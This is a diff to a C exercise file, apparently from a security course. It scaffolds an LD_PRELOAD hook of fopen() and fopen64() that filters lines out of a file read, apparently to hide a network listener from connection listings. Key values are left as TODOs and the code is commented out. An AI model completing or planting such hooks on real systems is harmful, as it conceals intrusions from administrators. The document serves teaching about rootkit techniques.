@@ -209,9 +209,11 @@ struct dirent64 *readdir64(DIR *dirp)
 }
 
 
+
+
 /**
 * TODO: complete fopen() by replacing all TODOs
-*
+*/
 
 /**
 * 
@@ -259,6 +261,66 @@ FILE *fopen(const char *pathname, const char *mode)
 	}
 
 	fp = orig_fopen(pathname, mode);
+	return fp;
+}
+
+*/
+
+
+
+/**
+ * TODO: complete fopen64() by replacing all TODOs
+ *
+ * Should be the same as what you did in fopen() expect for the first TODO,
+ * since a different library call is being hooked (fopen64 vs. fopen)
+ */
+
+
+
+/**
+* fopen64() is the same as fopen() but supports large files
+*
+* From the manpage: The fopen64() function is identical to the 
+* fopen() function except that the underlying file descriptor is 
+* created with the O_LARGEFILE flag set. The fopen64() function is a part of 
+* the large-file extensions.
+*
+* The code for fopen() and fopen64() should be nearly identical.
+*/
+
+
+/* Uncomment block comment when ready!
+
+FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+FILE *fopen64(const char *pathname, const char *mode)
+{
+	orig_fopen64 = dlsym(RTLD_NEXT, "TODO"); //Hint: what is the name of the function we are hooking?
+
+	char *ptr_tcp = strstr(pathname, "TODO");  // same as in fopen()
+
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp = tmpfile64();
+		fp = orig_fopen64(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, TODO); // same as in fopen()
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(TODO, TODO); // same as in fopen()
+			}
+		}
+		return temp;
+	}
+
+	fp = orig_fopen64(pathname, mode);
 	return fp;
 }
 
